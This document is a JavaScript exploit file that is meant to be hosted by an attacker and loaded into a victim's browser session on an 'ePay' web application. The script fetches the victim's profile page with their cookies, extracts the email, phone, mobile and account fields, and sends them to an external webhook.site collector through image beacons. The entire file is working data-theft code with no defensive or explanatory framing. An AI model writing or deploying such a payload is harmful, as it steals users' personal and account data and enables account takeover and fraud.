// exp.js  — host this on https://yourhost/exp.js
(function(){
  // fetch profile page with victim credentials

  fetch("/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0", { credentials: "include" })
  .then(function(res){ return res.text(); })
  .then(function(html){
    // extract inputs like: <input ... name="email" ... value="...">
    var data = {};
    try {
      html.replace(/<input[^>]*name=["']?([^"'\s>]+)["']?[^>]*value=["']?([^"']*)["']?/gi,
        function(_, name, val){
          data[name] = val;
          return "";
        });
    } catch(e) { /* ignore */ }

    // pick fields to exfiltrate (example: email)
    var email = data.email || "";

    // prepare small payload (avoid super-long URLs)
    var q = "email=" + encodeURIComponent(email);
    for(var k in data){
      // include up to a few fields
      if(k && (k==="email" || k==="phone" || k==="mobile" || k==="account")) {
        q += "&" + encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
      }
    }

    // final beacon — use webhook.site or your collector
    (new Image()).src = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2?d="+encodeURIComponent(q);
  })
  .catch(function(err){
    // fallback: send small error beacon
    (new Image()).src = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2?err="+encodeURIComponent(String(err));
  });
})();
